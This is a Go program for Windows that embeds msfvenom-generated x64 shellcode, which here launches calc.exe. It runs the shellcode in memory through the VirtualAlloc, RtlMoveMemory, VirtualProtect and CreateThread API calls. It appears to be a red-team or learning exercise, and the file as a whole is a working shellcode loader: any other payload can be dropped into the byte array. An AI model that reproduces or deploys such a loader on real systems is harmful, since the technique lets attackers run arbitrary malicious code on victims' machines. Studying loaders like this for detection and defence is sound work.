package main

import (
	"fmt"
	"syscall"
	"unsafe"
	"log"
)

func main(){

	// declaring shellcode (created from: msfvenom -p windows/x64/exec CMD=calc.exe)
	payload := []byte{0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00}
	payload_len := uintptr(len(payload))

	var kernel32 = syscall.NewLazyDLL("kernel32.dll")

	// calling VirtualAlloc to allocate memory for the shellcode
	var ProcVirtualAlloc = kernel32.NewProc("VirtualAlloc")
	memAlloc,_,err := ProcVirtualAlloc.Call(0, payload_len, 0x1000|0x2000, 0x04) // MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE
	if err.Error() != "The operation completed successfully." {
		log.Fatalln(err)
	}
	fmt.Println("[+] VirtualAlloc was successful")

	// moving the shellcode into the newly allocated memory
	// https://github.com/ChrisPritchard/golang-shellcode-runner/blob/master/main.go is helpful for the shellcode address syntax for the RtlMoveMemory call
	var ProcRtlMoveMemory = kernel32.NewProc("RtlMoveMemory")
	ProcRtlMoveMemory.Call(memAlloc, uintptr(unsafe.Pointer(&payload[0])), payload_len)
	fmt.Println("[+] RtlMoveMemory was successful")

	// calling VirtualProtect to set the memory as executable
	var ProcVirtualProtect = kernel32.NewProc("VirtualProtect")
	var oldprotect uint32 = 0
	vpRet,_,err := ProcVirtualProtect.Call(memAlloc, payload_len, 0x20, uintptr(unsafe.Pointer(&oldprotect))) // setting PAGE_EXECUTE_READ
	if err.Error() != "The operation completed successfully." && vpRet != 1 {
		log.Fatalln(err)
	}
	fmt.Println("[+] VirtualProtect call was successful")

	// running the shellcode with CreateThread
	var ProcCreateThread = kernel32.NewProc("CreateThread")
	var ProcWaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
	shellcodeHandle,_,err := ProcCreateThread.Call(0, 0, memAlloc, 0, 0)
	if err.Error() != "The operation completed successfully." {
		log.Fatalln(err)
	}
	fmt.Println("[+] Running shellcode...")
	ProcWaitForSingleObject.Call(shellcodeHandle, syscall.INFINITE)
}